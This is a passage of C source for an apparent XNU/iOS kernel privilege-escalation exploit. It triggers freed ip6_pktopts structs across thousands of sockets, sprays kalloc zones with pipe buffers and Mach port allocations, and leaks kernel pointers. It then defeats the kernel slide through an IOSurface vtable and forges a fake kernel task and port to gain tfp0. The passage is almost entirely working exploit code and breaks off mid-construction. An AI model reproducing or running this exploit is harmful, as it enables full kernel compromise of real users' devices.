/* printf("offsetof(struct ip6_pktopts,  ip6po_hlim) = %#x\n", offsetof(struct ip6_pktopts,  ip6po_hlim)); */
/* printf("offsetof(struct ip6_pktopts,  ip6po_pktinfo) = %#x\n", offsetof(struct ip6_pktopts,  ip6po_pktinfo)); */

/* printf("offsetof(struct ip6_pktopts,  ip6po_nhinfo.ip6po_nhi_nexthop) = %#x\n", offsetof(struct ip6_pktopts,  ip6po_nhinfo.ip6po_nhi_nexthop)); */
/* printf("offsetof(struct ip6_pktopts,  ip6po_nhinfo.ip6po_nhi_route) = %#x\n", offsetof(struct ip6_pktopts,  ip6po_nhinfo.ip6po_nhi_route)); */
/* printf("offsetof(struct ip6_pktopts,  ip6po_hbh) = %#x\n", offsetof(struct ip6_pktopts,  ip6po_hbh)); */
/* printf("offsetof(struct ip6_pktopts,  ip6po_dest1) = %#x\n", offsetof(struct ip6_pktopts,  ip6po_dest1)); */

/* printf("offsetof(struct ip6_pktopts,  ip6po_rhinfo.ip6po_rhi_rthdr) = %#x\n", offsetof(struct ip6_pktopts,  ip6po_rhinfo.ip6po_rhi_rthdr)); */
/* printf("offsetof(struct ip6_pktopts,  ip6po_rhinfo.ip6po_rhi_route) = %#x\n", offsetof(struct ip6_pktopts,  ip6po_rhinfo.ip6po_rhi_route)); */
/* printf("offsetof(struct ip6_pktopts,  ip6po_dest2) = %#x\n", offsetof(struct ip6_pktopts,  ip6po_dest2)); */
/* printf("offsetof(struct ip6_pktopts,  ip6po_tclass) = %#x\n", offsetof(struct ip6_pktopts,  ip6po_tclass)); */
/* printf("offsetof(struct ip6_pktopts,  ip6po_minmtu) = %#x\n", offsetof(struct ip6_pktopts,  ip6po_minmtu)); */
/* printf("offsetof(struct ip6_pktopts,  ip6po_prefer_tempaddr) = %#x\n", offsetof(struct ip6_pktopts,  ip6po_prefer_tempaddr)); */
/* printf("offsetof(struct ip6_pktopts,  ip6po_flags) = %#x\n", offsetof(struct ip6_pktopts,  ip6po_flags)); */

    /* printf("sizeof(kport_t) = %#x\n", sizeof(kport_t)); */
    /* printf("offsetof(kport_t,  ip_bits) = %#x\n", offsetof(kport_t,  ip_bits)); */
/* printf("offsetof(kport_t,  ip_references) = %#x\n", offsetof(kport_t,  ip_references)); */

/* printf("offsetof(kport_t,  ip_lock.data) = %#x\n", offsetof(kport_t,  ip_lock.data)); */
/* printf("offsetof(kport_t,  ip_lock.type) = %#x\n", offsetof(kport_t,  ip_lock.type)); */
/* printf("offsetof(kport_t,  ip_lock.pad) = %#x\n", offsetof(kport_t,  ip_lock.pad)); */

/* printf("offsetof(kport_t,  ip_messages.port.waitq.flags) = %#x\n", offsetof(kport_t,  ip_messages.port.waitq.flags)); */
/* printf("offsetof(kport_t,  ip_messages.port.waitq.waitq_interlock) = %#x\n", offsetof(kport_t,  ip_messages.port.waitq.waitq_interlock)); */
/* printf("offsetof(kport_t,  ip_messages.port.waitq.waitq_set_id) = %#x\n", offsetof(kport_t,  ip_messages.port.waitq.waitq_set_id)); */
/* printf("offsetof(kport_t,  ip_messages.port.waitq.waitq_prepost_id) = %#x\n", offsetof(kport_t,  ip_messages.port.waitq.waitq_prepost_id)); */

/* printf("offsetof(kport_t,  ip_messages.port.waitq.waitq_queue.next) = %#x\n", offsetof(kport_t,  ip_messages.port.waitq.waitq_queue.next)); */
/* printf("offsetof(kport_t,  ip_messages.port.waitq.waitq_queue.prev) = %#x\n", offsetof(kport_t,  ip_messages.port.waitq.waitq_queue.prev)); */
/* printf("offsetof(kport_t,  ip_messages.port.messages) = %#x\n", offsetof(kport_t,  ip_messages.port.messages)); */
/* printf("offsetof(kport_t,  ip_messages.port.seqno) = %#x\n", offsetof(kport_t,  ip_messages.port.seqno)); */
/* printf("offsetof(kport_t,  ip_messages.port.receiver_name) = %#x\n", offsetof(kport_t,  ip_messages.port.receiver_name)); */
/* printf("offsetof(kport_t,  ip_messages.port.msgcount) = %#x\n", offsetof(kport_t,  ip_messages.port.msgcount)); */
/* printf("offsetof(kport_t,  ip_messages.port.qlimit) = %#x\n", offsetof(kport_t,  ip_messages.port.qlimit)); */
/* printf("offsetof(kport_t,  ip_messages.port.pad) = %#x\n", offsetof(kport_t,  ip_messages.port.pad)); */
/* printf("offsetof(kport_t,  ip_messages.klist) = %#x\n", offsetof(kport_t,  ip_messages.klist)); */
/* printf("offsetof(kport_t,  ip_messages) = %#x\n", offsetof(kport_t,  ip_messages)); */
/* printf("offsetof(kport_t,  myipcspace_kaddr) = %#x\n", offsetof(kport_t,  myipcspace_kaddr)); */
/* printf("offsetof(kport_t,  ip_kobject) = %#x\n", offsetof(kport_t,  ip_kobject)); */
/* printf("offsetof(kport_t,  ip_nsrequest) = %#x\n", offsetof(kport_t,  ip_nsrequest)); */
/* printf("offsetof(kport_t,  ip_pdrequest) = %#x\n", offsetof(kport_t,  ip_pdrequest)); */
/* printf("offsetof(kport_t,  ip_requests) = %#x\n", offsetof(kport_t,  ip_requests)); */
/* printf("offsetof(kport_t,  ip_premsg) = %#x\n", offsetof(kport_t,  ip_premsg)); */
/* printf("offsetof(kport_t,  ip_context) = %#x\n", offsetof(kport_t,  ip_context)); */
/* printf("offsetof(kport_t,  ip_flags) = %#x\n", offsetof(kport_t,  ip_flags)); */
/* printf("offsetof(kport_t,  ip_mscount) = %#x\n", offsetof(kport_t,  ip_mscount)); */
/* printf("offsetof(kport_t,  ip_srights) = %#x\n", offsetof(kport_t,  ip_srights)); */
/* printf("offsetof(kport_t,  ip_sorights) = %#x\n", offsetof(kport_t,  ip_sorights)); */

    /* printf("offsetof(kport_t, ip_nsrequest) = %#x\n", offsetof(kport_t, ip_nsrequest)); */
    /* printf("offsetof(kport_t, ip_context) = %#x\n", offsetof(kport_t, ip_context)); */
    /* printf("offsetof(struct ip6_pktopts, ip6po_tclass) = %#x\n", */
    /*         offsetof(struct ip6_pktopts, ip6po_tclass)); */
    /* printf("offsetof(struct ip6_pktopts, ip6po_minmtu) = %#x\n", */
    /*         offsetof(struct ip6_pktopts, ip6po_minmtu)); */
    /* printf("offsetof(struct ip6_pktopts, ip6po_prefer_tempaddr) = %#x\n", */
    /*         offsetof(struct ip6_pktopts, ip6po_prefer_tempaddr)); */
    struct utsname u = {0};
    uname(&u);

    printf("%s %s %s %s %s\n", u.sysname, u.nodename, u.release, u.version,
            u.machine);

    HOSTNAME = u.nodename;

    size_t sz = sizeof(struct ip6_pktopts);
    if(sz == 0xb0 && strcmp(HOSTNAME, "pink") == 0){
        printf("UNCOMMENT ro_lle IN THE route_in6 STRUCT\n");
        return 1;
    }
    else if(sz == 0xc0 && strcmp(HOSTNAME, "blue") == 0){
        printf("COMMENT OUT ro_lle IN THE route_in6 STRUCT\n");
        return 1;
    }

    /* int if_count = -1; */
    /* size_t len = sizeof(if_count); */

    /* errno = 0; */
    /* if(sysctlbyname("net.link.generic.system.ifcount", &if_count, &len, NULL ,0)) */
    /*     printf("error %s\n", strerror(errno)); */

    /* printf("if_count %d\n", if_count); */
    /* return 1; */

    /* struct if_nameindex *names = if_nameindex(); */
    /* return 1; */

    mach_port_t leaked_port;
    kern_return_t kret = mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE,
            &leaked_port);

    if(kret){
        printf("couldn't allocate leaked_port: %s\n", mach_error_string(kret));
        return 1;
    }

    mach_port_set_context(mach_task_self(), leaked_port, 0x1122334455667788);

    kret = mach_port_insert_right(mach_task_self(), leaked_port, leaked_port,
            MACH_MSG_TYPE_MAKE_SEND);

    if(kret){
        printf("couldn't insert send right for leaked_port: %s\n",
                mach_error_string(kret));
        return 1;
    }

    mach_port_t nosenderport = MACH_PORT_NULL;
    kret = mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &nosenderport);

    if(kret){
        printf("couldn't allocate nosenderport for nsrequest on leaked_port: %s\n",
                mach_error_string(kret));
        return 1;
    }

    /* unused */
    mach_port_t prev = MACH_PORT_NULL;

    /* to disclose address of nosenderport later */
    /* kernel will set ip_nsrequest field of our fake port to point to nosenderport */
    kret = mach_port_request_notification(mach_task_self(), leaked_port,
            MACH_NOTIFY_NO_SENDERS, 0, nosenderport, MACH_MSG_TYPE_MAKE_SEND_ONCE, &prev);

    if(kret){
        printf("couldn't set leaked_port->ip_nsrequest with nosenderport: %s\n",
                mach_error_string(kret));
        return 1;
    }

    int num_pipes = 3100;
    int *pipes[num_pipes];

    for(int i=0; i<num_pipes; i++)
        pipes[i] = malloc(sizeof(int) * 2);

    int num_sockets = 4000;
    int sockets[num_sockets];

    printf("Creating %d vulnerable sockets...\n", num_sockets);

    for(int i=0; i<num_sockets; i++){
        /* this will initialize inp_depend6.inp6_outputopts for this socket */
        /* kalloc.192 allocation */
        int s = create_vulnerable_socket();

        if(s == -1){
            printf("Could not create socket %d\n", i);
            return 1;
        }

        sockets[i] = s;
    }

    // XXX 384 MB
    int zone_map_sz = 402653184;
    /* page size allocations, so we know these free pages will get
     * sent back to the zone allocator
     */
    int kzone = pagesize;

    /* fill 90% of the zone map, it's a lot but not so much that it triggers
     * garbage collection early
     */
    int num_pagesize_kallocs = (zone_map_sz * .90) / kzone;
    mach_port_t *pagesize_kallocs = malloc(sizeof(mach_port_t) * num_pagesize_kallocs);

    printf("Doing %d pagesize (kalloc.%d) allocations to set up for future garbage "
            "collection\n", num_pagesize_kallocs, kzone);

    for(int i=0; i<num_pagesize_kallocs; i++){
        mach_port_t p = kalloc(kzone);

        if(p != MACH_PORT_NULL)
            pagesize_kallocs[i] = p;
        else{
            printf("Ran out of kalloc.%d mem at %d\n", i, kzone);
            num_pagesize_kallocs = i;
            break;
        }
    }

    printf("Freeing inp_depend6.inp6_outputopts for each socket...\n");

    for(int i=0; i<num_sockets; i++){
        errno = 0;
        int err = disconnectx(sockets[i], 0, 0);

        if(err == -1){
            printf("disconnectx err %s\n", strerror(errno));
        }
    }

    int gc_kalloc_zone = pagesize;
    int num_gc_kallocs = (zone_map_sz * .6) / gc_kalloc_zone;

    printf("%d more kalloc.%d allocations to try and trigger garbage collection\n",
            num_gc_kallocs, gc_kalloc_zone);

    int gc_brk = 0;
    mach_port_t *gc_ports = malloc(sizeof(mach_port_t) * num_gc_kallocs);

    uint64_t maxtime = 0;
    for(int i=0; i<num_gc_kallocs; i++){
        uint64_t start = mach_absolute_time();
        mach_port_t p = kalloc(gc_kalloc_zone);
        uint64_t end = mach_absolute_time();
        if(p == MACH_PORT_NULL){
            printf("Final kalloc.%d spray: no space @ %d, gc should trigger\n", 
                    gc_kalloc_zone, i);
            break;
        }
        gc_ports[i] = p;
        uint64_t time = end - start;

        if(time > maxtime){
            maxtime = time;
            printf("new maxtime %lld @ %d\n", maxtime, i);
        }
        
        if(time > 100000){
            printf("Maybe gc at %d\n", i);
            gc_brk = i;
            break;
        }
    }

    /* if(gc_brk == 0){ */
    /*     printf("no gc?\n"); */
    /* } */

    int num_gcports = gc_brk != 0 ? gc_brk : num_gc_kallocs;

    for(int i=0; i<num_gcports; i++)
        mach_port_destroy(mach_task_self(), gc_ports[i]);

    free(gc_ports);
    gc_ports = NULL;

    /* create a bunch of kalloc.512 pipe buffers, if all went well,
     * several of our pipe buffers should overlap with the dangling
     * ip6_pktopts structs
     */
    struct ip6_pktopts pipe_spray_opts = {0};

    mach_port_t kalloc_512s[num_pipes];
    int num_kalloc_512s = 0;

    printf("Spraying pipe buffers and kalloc.512 OOL port allocations...\n");
    int num65535pbs = 0;

    for(int i=0; i<num_pipes; i++){
        if(pipe(pipes[i])){
            printf("create pipe %d: %s\n", i, strerror(errno));
            CLEANUP;
            return 1;
        }

        if(i % 2 == 0){
            ssize_t w;

            /* if(i % 8 == 0){ */
                pipe_spray_opts.ip6po_minmtu = (MINMTU_MAGIC << 16) | i;
                w = write(*(pipes[i] + 1), &pipe_spray_opts, sizeof(pipe_spray_opts));
            /* } */

            if(w == -1){
                printf("write to pipe %d: %s\n", i, strerror(errno));
                CLEANUP;
                return 1;
            }
        }
        else{
            mach_port_t p = kalloc_with_port(512, leaked_port);

            if(p == MACH_PORT_NULL)
                printf("no more kalloc.512 space while spraying pipe buffers @ %d\n", i);
            else{
                kalloc_512s[i] = p;
                num_kalloc_512s++;
            }
        }

        /* go slow, we didn't wait for a possible gc to finish earlier */
        pthread_yield_np();
        usleep(100);
    }

    int evil_socket = -1;
    int *evil_pipe = NULL;

    int FIND_EVIL_SOCKET_DEBUG = 0;
    int FIND_EVIL_SOCKET_DEBUG_LEVEL1 = 0;

    int zero_minmtus = 0;
    int zero_prefer_tempaddrs = 0;
    int zero_tclasses = 0;

    int got_evil_things = 0;

    struct array *kernel_pointer_array = array_new();

    printf("Looking for reallocated ip6_pktopts structs, also collecting OOL"
            " Mach port kernel pointers from them...\n");

    for(int i=0; i<num_sockets; i++){
        uint32_t minmtu = 0, prefer_tempaddr = 0, tclass = 0;

        if(get_minmtu(sockets[i], &minmtu))
            continue;

        if(get_prefer_tempaddr(sockets[i], &prefer_tempaddr))
            continue;

        if(get_tclass(sockets[i], &tclass))
            continue;

        /* printf("Socket %d: %#x %#x %#x\n", i, tclass, minmtu, prefer_tempaddr); */

        uint32_t minmtu_magic = MAGIC_FROM_MINMTU(minmtu);

        if(!got_evil_things && minmtu_magic == MINMTU_MAGIC){
            evil_socket = sockets[i];
            
            uint32_t possible_evil_pipe = PIPEIDX_FROM_MINMTU(minmtu);

            if(possible_evil_pipe > num_pipes){
                printf("pipe idx (%d) > num_pipes (%d)????\n",
                        possible_evil_pipe, num_pipes);
                CLEANUP;
                return 1;
            }

            evil_pipe = pipes[possible_evil_pipe];

            got_evil_things = 1;
        }

        uint64_t possible_kptr = ((uint64_t)minmtu << 32) | tclass;

        uint64_t mask = 0xffffffe000000000;
        uint64_t result = 0xffffffe000000000;

        if((possible_kptr & mask) == result){
            /* so the top 24 bits are valid... what about the other 40? */
            uint64_t bottom40 = possible_kptr & 0xfffffffff;

            if(bottom40 < 0x100000000 && bottom40 > 0x10000)
                array_insert(kernel_pointer_array, possible_kptr);
        }
    }

    if(FIND_EVIL_SOCKET_DEBUG_LEVEL1){
        /* printf("An additional %d ip6_pktopts struct(s) got reallocated, but" */
        /*         " had tclass == 0 (output suppressed)\n", zero_tclasses); */
        /* printf("An additional %d ip6_pktopts struct(s) got reallocated, but" */
        /*         " had minmtu == 0 (output suppressed)\n", zero_minmtus); */
        /* printf("An additional %d ip6_pktopts struct(s) got reallocated, but" */
        /*         " had prefer_tempaddr == 0 (output suppressed)\n", */
        /*         zero_prefer_tempaddrs); */
    }

    if(evil_socket == -1){
        printf("Couldn't reallocate a controlled ip6_pktopts struct in kalloc.512\n");
        CLEANUP;
        return 1;
    }

    uint32_t minmtu = 0;
    if(get_minmtu(evil_socket, &minmtu)){
        printf("Couldn't read minmtu from evil_socket? %s\n", strerror(errno));
        CLEANUP;
        return 1;
    }

    printf("Got a controlled ip6_pktopts struct in kalloc.512, minmtu: %#x\n", minmtu);
    printf("Evil socket: %d\n", evil_socket);

    /* don't need all these anymore */
    for(int i=0; i<num_pipes; i++){
        if(pipes[i] != evil_pipe){
            close(*pipes[i]);
            close(*(pipes[i] + 1));
            free(pipes[i]);
        }
    }

    for(int i=0; i<num_sockets; i++){
        if(sockets[i] != evil_socket)
            close(sockets[i]);
    }

    printf("Looking for a Mach port pointer from the kalloc.512 OOL allocations"
            " we did earlier...\n");

    uint64_t leaked_port_kaddr = 0;

    uint64_t most_frequent_kaddr = 0;
    int max_occurences = 0;

    for(int i=0; i<kernel_pointer_array->len; i++){
        uint64_t cur_kaddr = kernel_pointer_array->items[i];
        // XXX "deleted" kaddr
        if(cur_kaddr == 0)
            continue;

        int occurences = 0;

        for(int j=0; j<kernel_pointer_array->len; j++){
            if(kernel_pointer_array->items[j] == cur_kaddr)
                occurences++;
        }

        if(occurences > max_occurences){
            most_frequent_kaddr = cur_kaddr;
            max_occurences = occurences;
        }
    }

    array_destroy(&kernel_pointer_array);

    if(most_frequent_kaddr == 0){
        printf("Something went wrong while trying to find the mode of kptr array\n");
        POST_EXPLOIT_CLEANUP;
        return 1;
    }

    printf("Most frequent kernel pointer is %#llx with %d occurences "
            "(if it isn't from the OOL allocations we'll probably panic)\n",
            most_frequent_kaddr, max_occurences);

    errno = 0;
    kport_t kport = {0};
    int ret = EarlyKernelReadN(most_frequent_kaddr, &kport, sizeof(kport));

    if(ret){
        printf("Kernel read @ %#llx failed: %s\n", most_frequent_kaddr, strerror(errno));
        POST_EXPLOIT_CLEANUP;
        return 1;
    }

    if(kport.ip_context == LEAKED_PORT_CONTEXT)
        leaked_port_kaddr = most_frequent_kaddr;
    else{
        printf("%#llx is not from the OOL allocations?\n", most_frequent_kaddr);
        POST_EXPLOIT_CLEANUP;
        return 1;
    }

    printf("%#llx is a Mach port\n", leaked_port_kaddr);

    DumpKernelMemory(leaked_port_kaddr, sizeof(kport_t));

    /* printf("testing EarlyKernelWrite32\n"); */
    /* sleep(2); */
    /* EarlyKernelWrite32(leaked_port_kaddr, 0xaabbccdd); */

    /* DumpKernelMemory(leaked_port_kaddr, 0x50); */

    /* printf("testing EarlyKernelWrite64\n"); */

    /* for(;;){ */
    /*     sleep(2); */
    /*     EarlyKernelWrite64(leaked_port_kaddr, 0x9988776655443322); */
    /*     puts(""); */

    /*     DumpKernelMemory(leaked_port_kaddr, 0x50); */
    /* } */

    /* sleep(5); */

    uint64_t myipcspace_kaddr = 0;
    EarlyKernelRead64(leaked_port_kaddr + offsetof(kport_t, ip_receiver), &myipcspace_kaddr);

    uint64_t mytask_kaddr = 0;
    EarlyKernelRead64(myipcspace_kaddr + offsetof(struct ipc_space, is_task), &mytask_kaddr);

    uint64_t myproc_kaddr = 0;
    EarlyKernelRead64(mytask_kaddr + TASK_BSDINFO_OFFSET, &myproc_kaddr);

    uint64_t myproc_ucred_kaddr = 0;
    EarlyKernelRead64(myproc_kaddr + PROC_UCRED_OFFSET, &myproc_ucred_kaddr);

    printf("Our proc's credentials are at %#llx\n", myproc_ucred_kaddr);

    /* uint64_t my_crlabel_kaddr = 0; */
    /* EarlyKernelRead64(myproc_kaddr + UCRED_CR_LABEL_OFFSET, &my_crlabel_kaddr); */

    /* printf("Our proc's MAC label is at %#llx\n", my_crlabel_kaddr); */

    uint64_t kernproc_kaddr = 0;
    uint64_t curproc = myproc_kaddr;

    for(;;){
        uint32_t pid = -1;
        EarlyKernelRead32(curproc + PROC_PID_OFFSET, &pid);

        if(pid == 0){
            kernproc_kaddr = curproc;
            break;
        }

        EarlyKernelRead64(curproc, &curproc);
    }

    uint64_t kerntask_kaddr = 0;
    EarlyKernelRead64(kernproc_kaddr + PROC_TASK_OFFSET, &kerntask_kaddr);

    uint64_t kern_vmmap_kaddr = 0;
    EarlyKernelRead64(kerntask_kaddr + TASK_VMMAP_OFFSET, &kern_vmmap_kaddr);

    printf("Kernel vm_map is at %#llx\n", kern_vmmap_kaddr);

    /* register an IOSurfaceRootUserClient so we have access to its vtable,
     * and can derive kernel base and kernel slide
     */
    mach_port_t client = MACH_PORT_NULL;
    int surface_id = 0;
    kret = create_IOSurface_client(&client, &surface_id);

    if(kret){
        printf("Couldn't create IOSurface client: %s\n", mach_error_string(kret));
        POST_EXPLOIT_CLEANUP;
        return 1;
    }

    mach_ports_register(mach_task_self(), &client, 1);

    uint64_t iosurface_client_kaddr = 0;
    EarlyKernelRead64(mytask_kaddr + TASK_ITK_REGISTERED_OFFSET,
            &iosurface_client_kaddr);

    uint64_t kern_ipc_space_kaddr = 0;
    EarlyKernelRead64(iosurface_client_kaddr + offsetof(kport_t, ip_receiver),
            &kern_ipc_space_kaddr);

    uint64_t iosurface_client_kobject = 0;
    EarlyKernelRead64(iosurface_client_kaddr + offsetof(kport_t, ip_kobject),
            &iosurface_client_kobject);

    uint64_t iosurface_vtable = 0;
    EarlyKernelRead64(iosurface_client_kobject, &iosurface_vtable);

    uint64_t kfxn = 0;
    EarlyKernelRead64(iosurface_vtable, &kfxn);

    uint64_t kaddr = kfxn;
    kaddr &= ~0x3fff;

    uint64_t kernel_base = 0;

    for(;;){
        uint32_t val = 0;
        EarlyKernelRead32(kaddr, &val);

        if(val == 0xfeedfacf){
            kernel_base = kaddr;
            break;
        }

        kaddr -= 0x4000;
    }

    uint64_t kernel_slide = kernel_base - 0xfffffff007004000;

    printf("Kernel base: %#llx\n", kernel_base);
    printf("Kernel slide: %#llx\n", kernel_slide);

    /* unregister */
    mach_ports_register(mach_task_self(), NULL, 0);

    int taskpipe[2];
    if(pipe(taskpipe)){
        printf("pipe(taskpipe): %s\n", strerror(errno));
        POST_EXPLOIT_CLEANUP;
        return 1;
    }

    ktask_t faketask = {0};
    faketask.lock.data = 0;
    faketask.lock.type = 0x22;
    faketask.ref_count = 100;
    faketask.active = 1;
    faketask.map = kern_vmmap_kaddr;

    write(taskpipe[1], &FAKE_TASK_PIPE_MAGIC, sizeof(FAKE_TASK_PIPE_MAGIC));
    write(taskpipe[1], &faketask, sizeof(faketask));

    /* zero the remainder of our fake task struct out. sizeof(struct task) shouldn't
     * be more than 0x900 bytes
     */
    uint64_t bytesleft = 0x900;//512 - sizeof(FAKE_TASK_PIPE_MAGIC) - sizeof(faketask) - 1;
    char zerobuf[bytesleft];
    memset(zerobuf, 0, sizeof(zerobuf));
    write(taskpipe[1], zerobuf, sizeof(zerobuf));


    /* uint64_t cp_kaddr = 0; */
    /* EarlyKernelRead64(mytask_kaddr + TASK_ITK_REGISTERED_OFFSET, */
    /*         &cp_kaddr); */

    /* printf("faketfp0 is at %#llx\n", cp_kaddr); */

    int numcolliders = 250;

    mach_port_t colliderports[numcolliders];

    for(int i=0; i<numcolliders; i++)
        colliderports[i] = MACH_PORT_NULL;

    int numcolliderpipes = numcolliders;
    int *colliderpipes[numcolliderpipes];

    for(int i=0; i<numcolliderpipes; i++)
        colliderpipes[i] = malloc(sizeof(int) * 2);

    mach_port_t colliderports_recvs[numcolliders];

    /* page size allocations allocate linearly, so we're bound to have a pipe
     * buffer with its bottom 16 bits zero'ed out
     */
    int colliderkzone = pagesize;

    mach_port_t tfp0 = MACH_PORT_NULL;
    int *tfp0pipe = NULL;

    for(int i=0; i<numcolliders; i++){
        if(pipe(colliderpipes[i])){
            printf("create collider pipe %d: %s\n", i, strerror(errno));
            return 1;
        }

        char buf[colliderkzone - 1];
        /* mark pipe buffer as a kalloc.colliderkzone allocation */
        *(uint32_t *)buf = colliderkzone;
        *(uint32_t *)(buf + 4) = i;

        ssize_t w = write(*(colliderpipes[i] + 1), buf, sizeof(buf));

        if(w == -1){
            printf("write colliderpipes[%d]: %s\n", i, strerror(errno));
            return 1;
        }

        kret = mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE,
                &colliderports[i]);

        if(kret){
            printf("couldn't allocate faketfp0[%d]: %s\n", i,
                    mach_error_string(kret));
            return 1;
        }

        kret = mach_port_insert_right(mach_task_self(), colliderports[i],
                colliderports[i], MACH_MSG_TYPE_MAKE_SEND);

        if(kret){
            printf("couldn't insert send right for faketfp0: %s\n",
                    mach_error_string(kret));
            return 1;
        }
    }

    uint64_t *ourpipes = NULL;
    int pipecnt = 0;
    proc_pipes(&ourpipes, &pipecnt);

    uint64_t faketask_kaddr = 0;
    uint64_t tfp0pipebuf_kaddr = 0;

    printf("%d pipes\n", pipecnt);

    for(int i=0; i<numcolliders; i++){
        if(colliderports[i] == MACH_PORT_NULL)
            continue;

        kret = mach_ports_register(mach_task_self(), &colliderports[i], 1);

        if(kret){
            printf("couldn't register colliderports[%d]: %s\n", i,
                    mach_error_string(kret));
            return 1;
        }

        uint64_t cp_kaddr = 0;
        EarlyKernelRead64(mytask_kaddr + TASK_ITK_REGISTERED_OFFSET, &cp_kaddr);

        /* printf("fake tfp0 port %d\n", i); */

        if(cp_kaddr == 0)
            continue;

        for(int j=0; j<pipecnt; j++){
            uint64_t pipebuf = 0;
            EarlyKernelRead64(ourpipes[j] + PIPE_PIPEBUF_BUFFER_OFF, &pipebuf);

            if(!pipebuf)
                continue;

            /* check if this pipe is a collider pipe or if it holds our fake task */
            uint64_t val = 0;
            EarlyKernelRead64(pipebuf, &val);

            if(faketask_kaddr == 0 && val == FAKE_TASK_PIPE_MAGIC){
                faketask_kaddr = pipebuf + sizeof(FAKE_TASK_PIPE_MAGIC);
            }

            if((uint32_t)val != colliderkzone)
                continue;

            /* printf("%#llx (pipe buffer %d) vs %#llx (port %d)\n", pipebuf, j, */
            /*         cp_kaddr, i); */

            uint64_t cp_kaddr_upper48 = cp_kaddr & 0xffffffffffff0000;

            if(pipebuf == cp_kaddr_upper48){
                printf("Pipe buffer %d kptr and port %d kptr have the same upper"
                        " 48 bits! %#llx and %#llx\n", j, i, pipebuf, cp_kaddr);
                /* printf("Sleeping for 10secs\n"); */
                /* sleep(10); */

                tfp0 = colliderports[i];

                uint32_t pipeidx = 0;
                EarlyKernelRead32(pipebuf + 4, &pipeidx);
                printf("tfp0 pipe is colliderpipe %d\n", pipeidx);
                tfp0pipe = colliderpipes[pipeidx];
                tfp0pipebuf_kaddr = pipebuf;

                break;
            }
        }

        /* unregister */
        mach_ports_register(mach_task_self(), NULL, 0);

        if(tfp0 != MACH_PORT_NULL)
            break;
    }

    free(ourpipes);
    ourpipes = NULL;

    if(tfp0 == MACH_PORT_NULL){
        printf("Couldn't find a good pipe buffer/port pointer pair\n");
        POST_EXPLOIT_CLEANUP;
        return 1;
    }

    printf("Fake kernel task is at %#llx\n", faketask_kaddr);
    DumpKernelMemory(faketask_kaddr, sizeof(ktask_t) + 8);

    /* mach_port_t reg[TASK_PORT_REGISTER_MAX] = {0}; */
    /* mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &reg[1]); */
    /* mach_port_insert_right(mach_task_self(), reg[1], reg[1], MACH_MSG_TYPE_MAKE_SEND); */
    /* for some reason, the upper 32 bits of the third ipc_port pointer
     * in the itk_registered array are nonsense?
     */
    /* reg[0] = tfp0; */
    /* mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &reg[2]); */
    /* mach_port_insert_right(mach_task_self(), reg[2], reg[2], MACH_MSG_TYPE_MAKE_SEND); */

    /* int num_ports_behind_tfp0 = 20; */
    /* mach_port_t ports_behind_tfp0[num_ports_behind_tfp0]; */

    /* for(int i=0; i<num_ports_behind_tfp0; i++){ */

    /* } */

    printf("tfp0: %#x\n", tfp0);

    unsigned tfp0_portidx_before = MACH_PORT_INDEX(tfp0);
    unsigned tfp0_gennum_before = MACH_PORT_GEN(tfp0);
    /* printf("before mach_ports_register: tfp0_portidx_before %#x tfp0_gennum_before %#x\n", */
    /*         tfp0_portidx_before, tfp0_gennum_before); */
    printf("before: tfp0_portidx_before %#x tfp0_gennum_before %#x\n",
            tfp0_portidx_before, tfp0_gennum_before);

    struct ipc_space myipcspace = {0};
    EarlyKernelReadN(myipcspace_kaddr, &myipcspace, sizeof(myipcspace));
    /* printf("before: is_table_size %#x is_table %#llx\n", myipcspace.is_table_size, */
    /*         myipcspace.is_table); */

    uint64_t baseaddr = myipcspace.is_table +
        (sizeof(struct ipc_entry) * tfp0_portidx_before);

    /* printf("before mach_ports_register: dump of is_table + tfp0_portidx_before:\n"); */
    /* printf("before: dump of is_table + tfp0_portidx_before:\n"); */
    /* DumpKernelMemory(baseaddr - sizeof(struct ipc_entry), sizeof(struct ipc_entry) * 2); */

    struct ipc_entry tfp0_ipcentry = {0};
    EarlyKernelReadN(baseaddr, &tfp0_ipcentry, sizeof(tfp0_ipcentry));

    printf("before: tfp0_ipcentry ie_object: %#llx\n", tfp0_ipcentry.ie_object);

    unsigned gen = bits(tfp0_ipcentry.ie_bits, 24, 31);
    unsigned D = bits(tfp0_ipcentry.ie_bits, 20, 20);
    unsigned PS = bits(tfp0_ipcentry.ie_bits, 19, 19);
    unsigned SO = bits(tfp0_ipcentry.ie_bits, 18, 18);
    unsigned R = bits(tfp0_ipcentry.ie_bits, 17, 17);
    unsigned S = bits(tfp0_ipcentry.ie_bits, 16, 16);
    unsigned urefs = bits(tfp0_ipcentry.ie_bits, 0, 15);

    printf("before:\n");
    printf("\tgen: %#x\n", gen);
    printf("\tdead name: %d\n", D);
    printf("\tport set: %d\n", PS);
    printf("\tsend once: %d\n", SO);
    printf("\treceive: %d\n", R);
    printf("\tsend: %d\n", S);
    printf("\turefs: %d\n", urefs);


    /* printf("before: tfp0_ipcobject.io_bits %#x tfp0_ipcobject.io_references %#x\n", */
    /*         tfp0_ipcobject.io_bits, tfp0_ipcobject.io_references); */



    /* kret = mach_ports_register(mach_task_self(), reg, TASK_PORT_REGISTER_MAX); */
    /* kret = mach_ports_register(mach_task_self(), &tfp0, 1); */

    /* if(kret){ */
    /*     printf("Couldn't register soon-to-be tfp0: %s\n", */
    /*             mach_error_string(kret)); */
    /*     POST_EXPLOIT_CLEANUP; */
    /*     return 1; */
    /* } */

    /* printf("good!\n"); */

    /* DumpKernelMemory(mytask_kaddr + TASK_ITK_REGISTERED_OFFSET, */
    /*         3 * sizeof(void *)); */

    kport_t ktfp0 = {0};
    ktfp0.ip_bits = io_makebits(1, IOT_PORT, IKOT_TASK);
    ktfp0.ip_references = 100;
    ktfp0.ip_lock.data = 0;
    ktfp0.ip_lock.type = 0x11;
    ktfp0.ip_messages.port.qlimit = 1024;
    ktfp0.ip_receiver = kern_ipc_space_kaddr;
    ktfp0.ip_kobject = faketask_kaddr;
    ktfp0.ip_context = 0xeebbeebbaa55aa55;
    ktfp0.ip_srights = 99;

    /* printf("registered before:\n"); */
    /* mach_port_array_t ports; */
    /* mach_msg_type_number_t cnt; */
    /* kret = mach_ports_lookup(mach_task_self(), &ports, &cnt); */
    /* printf("%s\n", mach_error_string(kret)); */

